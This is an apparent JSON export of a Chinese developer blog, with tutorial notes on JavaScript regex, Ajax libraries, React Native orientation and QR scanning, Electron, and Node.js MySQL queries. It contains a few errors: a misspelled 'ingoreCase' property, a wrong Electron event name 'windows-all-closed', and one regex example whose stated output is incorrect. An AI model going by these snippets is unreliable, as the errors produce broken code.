Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"学习 - 正则表达式","slug":"Javascript/正则表达式/学习正则表达式","date":"2017-03-04T08:50:26.000Z","updated":"2021-06-15T06:10:52.825Z","comments":true,"path":"/stories/2017/03/Javascript/正则表达式/学习正则表达式/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/Javascript/正则表达式/学习正则表达式/","excerpt":"Javascript 中使用正则表达式在 JavaScript 中，正则表达式通常用于两个字符串方法 : search 和 replace search(regexp) 用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。 replace(regexp/substr, replacement) 用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。","text":"Javascript 中使用正则表达式在 JavaScript 中，正则表达式通常用于两个字符串方法 : search 和 replace search(regexp) 用于检索字符串中指定的子字符串，或检索与正则表达式相匹配的子字符串，并返回子串的起始位置。 replace(regexp/substr, replacement) 用于在字符串中用一些字符替换另一些字符，或替换一个与正则表达式匹配的子串。 正则表达式对象 RegExpRegExp 对象的属性。 字符 含义 global 是否是全文搜索，默认 false ingoreCase 执行对大小写不敏感的匹配，默认 false multiline 执行多行匹配，默认 false lastIndex 当前表达式匹配内容最后一个字符的下一个位置 source 正则表达式的文本字符串 1234567const exp = /\\b&#123;3&#125;/;exp.global; // falseexp.ingoreCase; // falseexp.multiline; // falseexp.lastIndex; // 0exp.source; // '/\\b&#123;3&#125;/' 方法： RegExp.prototype.test(str) 用于测试字符串参数是否匹配这个正则表达式，匹配返回 true。 RegExp.prototype.exec(str) 使用正则表达式模式对字符串进行搜索，并将更新全局 RegExp 对象的属性反映到匹配结果。如果有匹配则返回一个结果数组，否则返回 null。数组的第一个是原来的字符串，后面都是匹配的字符串。 比如： 1234567const str = '2015-12-07';const reg = /(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)/;const result = reg.exec(str);console.log(result);// [\"2015-12-07\", \"2015\", \"12\", \"07\"]// 对应 [str, $1, $2, $3] 注意 exec 只返回第一个匹配结果，如需要返回多个匹配结果请使用：String.match(reg) 修饰符Javascript 正则表达式里提供了三个修饰符。 字符 含义 g 执行全局匹配（查找所有匹配而非在找到第一个匹配后停止），默认匹配第一个。 i 执行对大小写不敏感的匹配，默认敏感。 m 执行多行匹配，默认不执行。 12345'Im like a, like b, like c'.replace(/\\blike\\b/, 'unlike');// =&gt; 'Im unlike a, like b, like c''Im like a, like b, like c'.replace(/\\blike\\b/g, 'unlike');// =&gt; 'Im unlike a, unlike b, unlike c' 元字符正则表达式有两种基本字符类型组成： 原义文本字符 元字符 元字符是在正则表达式中有特殊含义的非字母字符。 . * + ? $ ^ | \\ ( ) { } [ ] 元字符有： 字符 含义 \\t 水平制表符 \\v 垂直制表符 \\n 换行符 \\r 回车符 \\0 空字符 \\f 换页符 \\cX 与 X 对应的控制字符（ctrl+X） 字符类在一般情况下，正则表达式一个字符对应字符串一个字符。比如，表达式ab\\t的含义是：ab\\t 还可以使用元字符[ ]来构建某一个类。在[ ]里的逻辑是或。比如，就会匹配 a 或 b 或 c 12345'a1, b2, c3'.replace(/[a,b,c]/g, '-');// =&gt; '-1, -2, -3''a1, b2, c3'.replace(/[ab]/g, '-');// =&gt; '-1, -2, c3' 指定范围使用 - 来指定范围。 12345'a1, b2, c3'.replace(/[a-c]/g, '-');// =&gt; '-1, -2, -3''2013-02-12'.replace(/[0-9-]/g, '+');// ++++++++++ 取反使用 ^ 来取反。 12'a1, b2, c3'.replace(/[^a-c]/, '-');// =&gt; 'a-, b-, c-' 预定义类预定义类是，正则表达式给我们预定义好的表达式。 字符 等价类 含义 . [^\\r\\n] 除了回车符和换行符之外的所有字符 \\d [0-9] 数字字符 \\D [^0-9] 非数字字符 \\s [\\t\\n\\x0B\\f\\r] 空白字符 \\S [^\\t\\n\\x0B\\f\\r] 非空白字符 \\w [a-zA-Z_0-9] 单词字符（字母，下划线，数字） \\W [^a-zA-Z_0-9] 非单词字符（字母，下划线，数字） \\b 单词边界（空格） \\B 非单词边界（空格） 比如： 12'123abac'.replace(/\\d/g, '-');// =&gt; '---abac' 边界正则表达式提供几个常用的边界字符。 字符 含义 ^ 匹配开头，以 xxx 开头 $ 匹配结尾，以 xxx 结尾 \\b 单词边界（空格） \\B 非单词边界（空格） 量词 字符 含义 ? 出现零次或一次（最多出现一次） + 出现一次或多次（最少出现一次） * 出现零次或多次（任意次） {n} 出现 n 次，如 \\d{2}，出现2次数字 {n,m} 出现 n 到 m 次 {n,} 最少出现 n 次 {0,n} 最多出现 n 次 比如： 12345'123-345-2312'.replace(/^\\d&#123;3&#125;-\\d&#123;3&#125;-\\d&#123;4&#125;$/g, 's');// =&gt; 's''123-345-2312'.replace(/^\\d&#123;3&#125;/g, 's');// =&gt; 's-345-2312' 贪婪模式Javascript 默认正则表达式是贪婪模式。 比如，下面匹配就会贪婪的匹配到了 123456，也就是尽可能的使用到了 \\d{6} 12'12345abc'.replace(/\\d&#123;3,6&#125;/g, '-');// =&gt; '-abc' 非贪婪模式在量词后面加上?，就是使用非贪婪模式，也就是尽可能的使用 \\d{3}一般有：\\d{3}?，(.*?)，(.+?)这些都是非贪婪模式。 12'12345abc'.replace(/\\d&#123;3,6&#125;?/g, '-');// =&gt; '-45abc' 分组分组在正则匹配中是非常有用的。使用 ( ) 指定分组，第一组的内容会被存放到$1里面，如此类推。($n, n &lt; 10)。看下面的例子就知道，首先它匹配到了第6条链接，再把整个链接替换成分组内容。 123456789101112var str =\"http://123.com/image/dasddasdas.png\" + '\\n' +\"http://123.com/image/dasdadass.png\" + '\\n' +\"https://123.com/image/dasdasdas.jpg\" + '\\n' +\"http://123.com/image/dasda1232s.png\" + '\\n' +\"https://123.com/image/dasdadasds.jpg\" + '\\n' +\"http://123.com/image/dasdasdas.jpg\" + '\\n' +\"http://123.com/image/dasdaasds.png\" ;str.replace(/http:.+image\\/(.+\\.jpg)/gm, '$1');// =&gt; dasdasdas.jpg 在使用量词，有时会有歧义，需要使用到分组： 12/body&#123;3&#125;/ // 指的是 y 重复 3 次/(body)&#123;3&#125;/ // 指的是 body 重复 3 次 或使用 | 可以达到或的效果。 12345678'Byr(on|cn)sy'.replace(/on|cn/g, '-');// =&gt; 'Byr(-|-)sy''Byronsy'.replace(/on|cn/g, '-');// =&gt; 'Byr-sy''Byrcnsy Byronsy'.replace(/Byr(on|cn)sy/g, '-');// =&gt; '- -' 反向引用主要使用 $n比如：2015-12-07 =&gt; 07/12/2015 12'2015-12-07'.replace(/(\\d&#123;4&#125;)-(\\d&#123;2&#125;)-(\\d&#123;2&#125;)/, '$3/$2/$1');// =&gt; '07/12/2015' 忽略分组忽略分组后，它并不会自动填充到$n里面。这时候，只需要加上 ?: 比如： 12'a-bc-edf'.replace(/(?:b)/g, '$1');// =&gt; 'a-$1c-edf' 前瞻，后顾正则表达式从文本头部向尾部开始解析，文本的尾部方向称为“前瞻”。前瞻就是在正则表达式匹配到规则的时候，向前检查是否符合断言。后顾就是与前缀相反的。但是，Javascript 不支持后顾 对于符号要求的断言称为：正向/肯定匹配，反之为：负向/否定匹配。 名称 正则 正向前瞻 exp(?=assert) 负向前瞻 exp(?!assert) 比如： 1234567891011'a2*3'.replace(/\\w(?=\\d)/g, '-');// =&gt; \"-2*3\", 要求，单词字符前面接数字'ab*3'.replace(/\\w(?=\\d)/g, '-');// =&gt; 'ab*3''a2*3'.replace(/\\w(?!\\d)/g, '-');// =&gt; 'a-*-''ab*3'.replace(/\\w(?!\\d)/g, '-');// =&gt; '--*-'","categories":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/categories/Javascript/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"正则表达式","slug":"正则表达式","permalink":"http://me.lizhooh.com/tags/正则表达式/"}]},{"title":"Web Ajax 框架","slug":"HTML5/学习笔记/Web Ajax 框架","date":"2017-03-03T13:45:09.000Z","updated":"2021-06-15T06:10:52.823Z","comments":true,"path":"/stories/2017/03/HTML5/学习笔记/Web Ajax 框架/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/HTML5/学习笔记/Web Ajax 框架/","excerpt":"axios , reqwest , fetch axios: Promise based HTTP client for the browser and node.jsreqwest: browser asynchronous http requestsfetch: A window.fetch JavaScript polyfill.","text":"axios , reqwest , fetch axios: Promise based HTTP client for the browser and node.jsreqwest: browser asynchronous http requestsfetch: A window.fetch JavaScript polyfill. 安装安装都是 npm install name –save axiosaxios 的 API 使用与 fetch 很像。 get 请求123456789101112131415161718192021// Make a request for a user with a given IDaxios.get('/user?ID=12345').then(function (response) &#123; console.log(response);&#125;).catch(function (error) &#123; console.log(error);&#125;);// Optionally the request above could also be done asaxios.get('/user', &#123; params: &#123; ID: 12345 &#125;&#125;).then(function (response) &#123; console.log(response);&#125;).catch(function (error) &#123; console.log(error);&#125;); post 请求12345678910axios.post('/user', &#123; firstName: 'Fred', lastName: 'Flintstone'&#125;).then(function (response) &#123; console.log(response);&#125;).catch(function (error) &#123; console.log(error);&#125;); 并发请求类似于 Promise.all 1234567axios.all([ axios.get('/user/12345'), axios.get('/user/12345/permissions')]).then(axios.spread(function (acct, perms) &#123; // Both requests are now complete&#125;)); 自定义 headers12345678910axios('http://bit.ly/2mTM3nY', &#123; method:'get', responseType:'stream', headers: &#123; 'X-Requested-With': 'XMLHttpRequest', &#125;&#125;).then(function(response) &#123; response.data.pipe(fs.createWriteStream('ada_lovelace.jpg'))&#125;); fetchfetch.js 就不介绍了。请看这篇： React Native Fetch 网络请求 浏览器兼容性： Chrome Firefox Safari 6.1+ Internet Explorer 10+ reqwestreqwest.js 是一个用于浏览器异步 HTTP 请求。支持 xmlHttpRequest, JSONP, CORS, 和 CommonJS 约束。它的体积非常小，min 版本只有 8kb。zip 压缩只有 3kb。 浏览器兼容 IE6+ Chrome 1+ Safari 3+ Firefox 1+ Opera 基本的 API1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889reqwest('path/to/html', function (resp) &#123; qwery('#content').html(resp)&#125;)reqwest(&#123; url: 'path/to/html', method: 'post', data: &#123; foo: 'bar', baz: 100 &#125;, success: function (resp) &#123; qwery('#content').html(resp) &#125;&#125;)reqwest(&#123; url: 'path/to/html', method: 'get', data: [&#123; name: 'foo', value: 'bar' &#125;, &#123; name: 'baz', value: 100 &#125;], success: function (resp) &#123; qwery('#content').html(resp) &#125;&#125;)reqwest(&#123; url: 'path/to/json', type: 'json', method: 'post', error: function (err) &#123; &#125;, success: function (resp) &#123; qwery('#content').html(resp.content) &#125;&#125;)reqwest(&#123; url: 'path/to/json', type: 'json', method: 'post', contentType: 'application/json', headers: &#123; 'X-My-Custom-Header': 'SomethingImportant' &#125;, error: function (err) &#123; &#125;, success: function (resp) &#123; qwery('#content').html(resp.content) &#125;&#125;)// Uses XMLHttpRequest2 credentialled requests (cookies, HTTP basic auth) if supportedreqwest(&#123; url: 'path/to/json', type: 'json', method: 'post', contentType: 'application/json', crossOrigin: true, withCredentials: true, error: function (err) &#123; &#125;, success: function (resp) &#123; qwery('#content').html(resp.content) &#125;&#125;)reqwest(&#123; url: 'path/to/data.jsonp?callback=?', type: 'jsonp', success: function (resp) &#123; qwery('#content').html(resp.content) &#125;&#125;)reqwest(&#123; url: 'path/to/data.jsonp?foo=bar', type: 'jsonp', jsonpCallback: 'foo', jsonpCallbackName: 'bar', success: function (resp) &#123; qwery('#content').html(resp.content) &#125;&#125;)reqwest(&#123; url: 'path/to/data.jsonp?foo=bar', type: 'jsonp', jsonpCallback: 'foo', success: function (resp) &#123; qwery('#content').html(resp.content) &#125;, complete: function (resp) &#123; qwery('#hide-this').hide() &#125;&#125;) Promise API1234567891011121314151617181920212223242526272829303132333435363738394041424344reqwest(&#123; url: 'path/to/data.jsonp?foo=bar', type: 'jsonp', jsonpCallback: 'foo'&#125;).then(function (resp) &#123; qwery('#content').html(resp.content)&#125;, function (err, msg) &#123; qwery('#errors').html(msg)&#125;).always(function (resp) &#123; qwery('#hide-this').hide()&#125;)reqwest(&#123; url: 'path/to/data.jsonp?foo=bar', type: 'jsonp', jsonpCallback: 'foo'&#125;).then(function (resp) &#123; qwery('#content').html(resp.content)&#125;).fail(function (err, msg) &#123; qwery('#errors').html(msg)&#125;).always(function (resp) &#123; qwery('#hide-this').hide()&#125;)var r = reqwest(&#123; url: 'path/to/data.jsonp?foo=bar', type: 'jsonp', jsonpCallback: 'foo', success: function () &#123; setTimeout(function () &#123; r.then(function (resp) &#123; qwery('#content').html(resp.content) &#125;, function (err) &#123; &#125;) .always(function (resp) &#123; qwery('#hide-this').hide() &#125;) &#125;, 15) &#125;&#125;) 最后reqwest 能兼容到 IE6，axios 兼容到 IE8，fetch 兼容到 IE10。最后，我推荐使用 axios.js, fetch.js。 参考资料 reqwest: https://github.com/ded/reqwestaxios: https://github.com/mzabriskie/axiosfetch: https://github.com/github/fetch","categories":[{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/categories/HTML5/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"网络请求","slug":"网络请求","permalink":"http://me.lizhooh.com/tags/网络请求/"},{"name":"HTML5","slug":"HTML5","permalink":"http://me.lizhooh.com/tags/HTML5/"}]},{"title":"React Native 屏幕方向控制","slug":"React Native/Router/React Native 屏幕方向控制","date":"2017-03-03T06:56:20.000Z","updated":"2021-06-15T06:10:52.867Z","comments":true,"path":"/stories/2017/03/React Native/Router/React Native 屏幕方向控制/","link":"","permalink":"http://me.lizhooh.com/stories/2017/03/React Native/Router/React Native 屏幕方向控制/","excerpt":"屏幕方向控制react-native-orientation 是一个用来控制 Andraid/Ios 屏幕方向。它使用原生的代码 JAVA/OC 与 Javascript 产生链接，提供接口给 Javascript 调用。","text":"屏幕方向控制react-native-orientation 是一个用来控制 Andraid/Ios 屏幕方向。它使用原生的代码 JAVA/OC 与 Javascript 产生链接，提供接口给 Javascript 调用。 安装注意：作者太懒，npm 上的版本与 github 上不一致没更新，所以使用 github 的源。 1npm install git+https://github.com/yamill/react-native-orientation.git --save 连接连接方式有自动连接与手动连接，两种方式。如果自动连接不行，请手动连接。 自动连接1rnpm link react-native-orientation 手动连接IOS 添加node_modules/react-native-orientation/iOS/RCTOrientation.xcodeproj到您的xcode项目，通常在Libraries组下添加libRCTOrientation.a（从Products下RCTOrientation.xcodeproj）以构建目标的Linked Frameworks and Libraries列表 Andraid: 在 android/setting.gradle，添加代码 12include ':react-native-orientation'project(':react-native-orientation').projectDir = new File(rootProject.projectDir, '../node_modules/react-native-orient 在 android/app/build.gradle，大概在 145 行处 1234dependencies &#123; // ... compile project(':react-native-orientation') // &lt;---- add&#125; 注册模块（在MainApplication.java中） 1234567891011import com.github.yamill.orientation.OrientationPackage; // &lt;--- importpublic class MainApplication extends Application implements ReactApplication &#123; @Override protected List&lt;ReactPackage&gt; getPackages() &#123; return Arrays.&lt;ReactPackage&gt;asList( new MainReactPackage(), new OrientationPackage() // &lt;--- Add this ); &#125;&#125; 使用注意，需要把 App 重新编译一次，不然会报错：undefined is not a Object. 1import Orientation from 'react-native-orientation'; 12345678910111213141516componentWillMount() &#123; // 判断横竖屏幕 const initial = Orientation.getInitialOrientation(); if (initial === 'PORTRAIT') &#123; // 竖屏 &#125; else &#123; // 其他 &#125; // 只允许竖屏 Orientation.lockToPortrait(); //只允许横屏 Orientation.lockToLandscape();&#125; 事件123456789// 增加，屏幕方向监听addOrientationListener(function(orientation) &#123; &#125;);// 移除，屏幕方向监听removeOrientationListener(function(orientation) &#123; &#125;);// 增加，精确的屏幕方向监听addSpecificOrientationListener(function(specificOrientation) &#123; &#125;);// 移除，精确的屏幕方向监听removeSpecificOrientationListener(function(specificOrientation) &#123; &#125;); 方法这些能主动的控制屏幕的方向，比如播放视频时，调用 lockToLandscape （横屏） 123456789101112131415lockToPortrait(); // 竖屏lockToLandscape(); // 横屏lockToLandscapeLeft();lockToLandscapeRight();unlockAllOrientations();getOrientation(function(err, orientation) &#123; // orientation can // return either (LANDSCAPE PORTRAIT UNKNOWN PORTRAITUPSIDEDOWN)&#125;);getSpecificOrientation(function(err, specificOrientation) &#123; // specificOrientation can // return either (LANDSCAPE-LEFT LANDSCAPE-RIGHT PORTRAIT UNKNOWN PORTRAITUPSIDEDOWN)&#125;); 参考资料 https://github.com/yamill/react-native-orientation","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native Camera 实现二维码扫描","slug":"React Native/Media/React Native Camera 实现二维码扫描","date":"2017-02-28T07:42:00.000Z","updated":"2021-06-15T06:10:52.855Z","comments":true,"path":"/stories/2017/02/React Native/Media/React Native Camera 实现二维码扫描/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/React Native/Media/React Native Camera 实现二维码扫描/","excerpt":"CameraCamera 是基于原生组件的摄像头（拍照/录像）组件。Camera 非常强大，它不但能拍照，录像，还提供了二维码扫描。Camera github: https://github.com/Applifier/react-native-camera","text":"CameraCamera 是基于原生组件的摄像头（拍照/录像）组件。Camera 非常强大，它不但能拍照，录像，还提供了二维码扫描。Camera github: https://github.com/Applifier/react-native-camera 拿则官方提供的 Demo 运行后，给它添加onBarCodeRead 事件，就可以进行二维码扫描。但你拿着摄像头对准二维码时，一旦扫描成功后，就会触发onBarCodeRead，而且这个触发是重复多次的。只要你没有拿开摄像头，它就会一直触发，所以你需要自己标记一下。 二维码扫描要实现如图的二维码扫描，先是把 UI 写好，然后就是处理数据了。Camera 允许子视图渲染，你需要把&lt;Camera&gt;设置层全屏充满（除了Toolbar）。然后在&lt;Camera&gt;内渲染子视图。 12345678910&lt;Camera ref=&#123;(cam) =&gt; &#123; this.camera = cam &#125; &#125; style=&#123;styles.preview&#125; aspect=&#123;Camera.constants.Aspect.fill&#125; captureQuality=&#123;'medium'&#125; onBarCodeRead=&#123;(data) =&gt; &#123; &#125;&#125; &gt; &#123;/* 在这里渲染 二维码扫描 UI*/&#125;&lt;/Camera&gt; 12345preview: &#123; flex: 1, justifyContent: 'center', alignItems: 'center',&#125;, 实现二维码视图思路是除了中间外其他都设置一个半透明的黑色背景，中间全透明。使用 flexbox 布局非常简单。 1234567891011121314151617&lt;View style=&#123;styles.modal&#125;&gt; &lt;View style=&#123;styles.shade&#125;&gt;&lt;/View&gt; &lt;View style=&#123;&#123; flexDirection: 'row' &#125;&#125;&gt; &lt;View style=&#123;styles.shade&#125;&gt;&lt;/View&gt; &lt;View style=&#123;styles.qrcode&#125;&gt; &lt;Animated.View style=&#123;[styles.line, &#123; translateY: this.state.line_position &#125;]&#125; /&gt; &lt;/View&gt; &lt;View style=&#123;styles.shade&#125;&gt;&lt;/View&gt; &lt;/View&gt; &lt;View style=&#123;[styles.shade, styles.content]&#125;&gt; &lt;Text style=&#123;styles.text&#125;&gt;将二维码/条码放入框内，即可自动扫描&lt;/Text&gt; &lt;/View&gt;&lt;/View&gt; 12345678910111213modal: &#123; flex: 1, width: Dimensions.get('window').width,&#125;,shade: &#123; flex: 1, backgroundColor: 'rgba(1, 1, 1, 0.65)',&#125;,qrcode: &#123; width: 200, height: 200, alignItems: 'center',&#125;, 中间扫描条动画使用 Animated API 来制作扫描条动画，并且是循环动画。动画结束后，重新设置动画值，再回调。 123456789101112131415this.state = &#123; line_position: new Animated.Value(0),&#125;// ...lineAnimated = () =&gt; &#123; this.state.line_position.setValue(0); Animated.timing(this.state.line_position, &#123; toValue: 200, duration: 3500, easing: Easing.linear, &#125;).start(() =&gt; &#123; this.lineAnimated(); &#125;);&#125;; 123&lt;Animated.View style=&#123;[styles.line, &#123; translateY: this.state.line_position &#125;]&#125;&gt;&lt;/Animated.View&gt; 监听扫描事件在&lt;Camera&gt;上监听扫描事件，并把数据通过navigator重定向到另一个页面。 onBarCodeRead事件一个参数，data。data 的形式一般为：Object {type: &quot;EAN_13&quot;, data: &quot;9787115425263&quot;}其中，type 是二维码的类型，data 是二维码的数据。 1234567onBarCodeRead=&#123;(data) =&gt; &#123; // Object &#123;type: \"EAN_13\", data: \"9787115425263\"&#125; this.props.navigator.replace(&#123; id: 2, data: data, &#125;);&#125; &#125; 发现一个问题如果使用navigator.push来添加一个页面层。就会产生多个页面层（本来想添加一层，但是它添加了好几层）。 原因是：当你 navigator.push 一个新的页面时，而二维码扫描的页面并没有销毁，它只是被一个新的扫描结果页面给挡住了，它的&lt;Camera&gt;的事件还可以执行。 就这样，只要你不迅速让摄像头离开二维码，onBarCodeRead就会重复多次的触发，就会有连续 push 的后果。最后想不到解决方案，而使用navigator.replace，来通过重定向销毁之前的页面。 还有 camera 有点很卡，在我的手机上UI, JS FPS 平均 35 帧。 更新：后来想到的办法：判断 navigator 顶端页面，是否是扫描二维码结果页面，是则跳过 navigator.push。建议还是使用 navigator.replace 1234567891011onBarCodeRead= (data) =&gt; &#123; const routes = this.props.navigator.getCurrentRoutes(); const routeLast = routes[routes.length - 1]; if(routeLast.id * 1 !== 2) &#123; this.props.navigator.push(&#123; id: 2, data: data, &#125;); &#125;&#125; 示例代码代码已经放到了我的 github 上: https://github.com/Lizhooh/react-native-qrcode-scan 参考资料 https://github.com/Applifier/react-native-camera","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"使用 Electron 开发桌面应用","slug":"Electron/使用 Electron 开发桌面应用","date":"2017-02-25T06:04:30.000Z","updated":"2021-06-15T06:10:52.814Z","comments":true,"path":"/stories/2017/02/Electron/使用 Electron 开发桌面应用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/Electron/使用 Electron 开发桌面应用/","excerpt":"ElectronElectron 提供了一个实时构建桌面应用的纯 JavaScript 环境。Electron 可以获取到你定义在 package.json 中 main 文件内容，然后执行它。 通过这个文件（通常我们称之为 main.js），可以创建一个应用窗口，这个应用窗口包含一个渲染好的 web 界面，还可以和系统原生的 GUI 交互。 具体来说，就是当你启动了一个 Electron 应用，就有一个主进程（main process ）被创建了。这条进程将负责创建出应用的 GUI（也就是应用的窗口），并处理用户与这个 GUI 之间的交互。 Electron 集成了 Chrome 与 Nodejs，你可以在里面任意的使用 Chrome 与 Nodejs 的能力来构建桌面应用。","text":"ElectronElectron 提供了一个实时构建桌面应用的纯 JavaScript 环境。Electron 可以获取到你定义在 package.json 中 main 文件内容，然后执行它。 通过这个文件（通常我们称之为 main.js），可以创建一个应用窗口，这个应用窗口包含一个渲染好的 web 界面，还可以和系统原生的 GUI 交互。 具体来说，就是当你启动了一个 Electron 应用，就有一个主进程（main process ）被创建了。这条进程将负责创建出应用的 GUI（也就是应用的窗口），并处理用户与这个 GUI 之间的交互。 Electron 集成了 Chrome 与 Nodejs，你可以在里面任意的使用 Chrome 与 Nodejs 的能力来构建桌面应用。 初始化应用使用 Electron + 单页面应用是一个完美的组合。 Electron 程序初始化时，会先找到一个入口 html 文件。整个应用程序从入口文件开始，之后的页面切换，看你的单页面应用。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647const &#123; app, BrowserWindow,&#125; = require('electron');// 窗体对象let mainWindow = null;// 创建窗体const createWindow = function() &#123; mainWindow = new BrowserWindow(&#123; width : 960, height: 640, &#125;); // 加载应用入口文件 mainWindow.loadURL(`file://$&#123;__dirname&#125;/src/view/index.html`); // 启用开发工具 mainWindow.webContents.openDevTools(); // 监听窗体关闭事件 mainWindow.on('close', function() &#123; mainWindow = null; &#125;);&#125;;// Electron 初始化应用窗口app.on('ready', createWindow);// 全部窗口退出时，触发的事件app.on('windows-all-closed', function() &#123; // 在 macOS 上，除非用户用 Cmd + Q 确定地退出， // 否则绝大部分应用及其菜单栏会保持激活。 if(process.platform !== 'darwin') &#123; app.quit(); &#125;&#125;);// 活动事件app.on('activate', function() &#123; // 在 macOS 上，当点击 dock 图标并且该应用没有打开的窗口时， // 绝大部分应用会重新创建一个窗口。 if(mainWindow === null) &#123; createWindow(); &#125;&#125;); Chrome 与 Node 结合上面说了，Electron 集成 Chrome, Nodejs，也就是可以把 Web开发 与 Nodejs 开发结合起来。在页面里可以使用 Nodejs 的任何 API，包括第三方库，数据库连接。下面演示在页面里使用 Nodejs 进行网络请求，根据新浪天气的 API 获取天气信息。 下面使用到的一些 Nodejs 模块： 123456\"dependencies\": &#123; \"colors\": \"^1.1.2\", \"electron\": \"1.4.6\", \"node-fetch\": \"^1.6.3\", \"xml2js\": \"^0.4.17\"&#125; 入口文件：index.html 12345678910111213141516171819&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\" /&gt; &lt;title&gt;demo&lt;/title&gt; &lt;style&gt; html, body &#123; font-family: '微软雅黑' Verdana, sans-serif; font-size: 15px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;pre id=\"content\" style=\"font-weight: bold;\"&gt;&lt;/pre&gt; &lt;script src=\"../js/reset.js\"&gt;&lt;/script&gt; &lt;script src=\"../js/main.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 主要文件：main.js使用 node-fetch 进行网络请求，使用 xml2js 进行 xml 解析转为 json 1234567891011121314151617181920212223242526272829const fetch = require('node-fetch');const process = require('process');const xml2js = require('xml2js');const xmltojson = new xml2js.Parser();fetch(`http://php.weather.sina.com.cn/xml.php? city=%B1%B1%BE%A9&amp;password=DJOYnieT8234jlsK&amp;day=0`) .then(res =&gt; res.text()) .then(xml =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; xmltojson.parseString(xml, (err, result) =&gt; &#123; return err ? reject(err) : resolve(result); &#125;); &#125;); &#125;) .then(json =&gt; &#123; console.log(json); $('#content').innerHTML = JSON.stringify( json.Profiles.Weather, null, 4 ); &#125;) .catch(err =&gt; &#123; console.error(err); &#125;);console.log('Nodejs version:', process.versions.node);console.log('Chrome version:', process.versions.chrome); 运行结果：","categories":[{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/categories/Electron/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Electron","slug":"Electron","permalink":"http://me.lizhooh.com/tags/Electron/"}]},{"title":"Nodejs 使用 MySQL","slug":"Nodejs/Nodejs 使用 Mysql","date":"2017-02-25T01:36:37.000Z","updated":"2021-06-15T06:10:52.838Z","comments":true,"path":"/stories/2017/02/Nodejs/Nodejs 使用 Mysql/","link":"","permalink":"http://me.lizhooh.com/stories/2017/02/Nodejs/Nodejs 使用 Mysql/","excerpt":"db-mysqlMySQL 成为最火的开源关系式数据库是有原因的：它免费提供了与大型商用数据库一样的众多功能。在 Nodejs 上连接 MySQL 使用到了一个官方模块 db-mysql 安装： 1npm install --save db-mysql","text":"db-mysqlMySQL 成为最火的开源关系式数据库是有原因的：它免费提供了与大型商用数据库一样的众多功能。在 Nodejs 上连接 MySQL 使用到了一个官方模块 db-mysql 安装： 1npm install --save db-mysql 连接 MySQL连接 MySQL 使用到的一些 db-mysql 提供的接口。 配置连接 MySQL 的信息： 123456789101112const db = new mysql.Database(&#123; 'hostname': '127.0.0.1', // mysql 连接地址 'user' : 'dev', // 用户名 'password': '123456', // 密码 'database': 'test', // 数据库名&#125;);db.connect((err) =&gt; &#123; if(err) return console.dir(err); console.log('你已经连接了数据库');&#125;); MySQL 查询db-mysql 提供原生的 SQL 语句进行查询，也提供了类似 MongoDB 的查询接口。 SQL 查询下面示例，使用 SQL 进行查询。其中 ? 代表的是占位符的意思。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182// 创建表db.query('' + 'Create Table Student( ' + ' id smallint not null primary key, ' + ' name varchar(20) not null, ' + ' age tinyint not null, ' + ' sex char(4) not null ' + ') Engine=Innodb Default Charset=utf8; ', function(error, packet) &#123; if(error) throw error; // 创建表成功 console.log('1. 创建表成功'); &#125;);// 插入db.query( 'Insert into Student Values(?, ?, ?, ?)', [1, '小东', 20, '男'], // 自动会防 sql 注入处理 function(error, packet) &#123; if(error) throw error; // 插入成功 console.log('2. 插入数据成功'); &#125;);// 查询db.query( 'Select * From Student Where id = ' + number, // 字符串拼接不会防 sql 注入处理 function(error, rows) &#123; if(error) throw error; // 处理查询结果 rows is Array console.log('3. 查询成功') console.log(JSON.stringify(rows, null, 4)); &#125;);// 更新db.query( 'Update Student Set name = ? Where id = ?', ['小明', 1], function(error, packet) &#123; if(error) throw error; // 更新成功 console.log('4. 更新成功'); 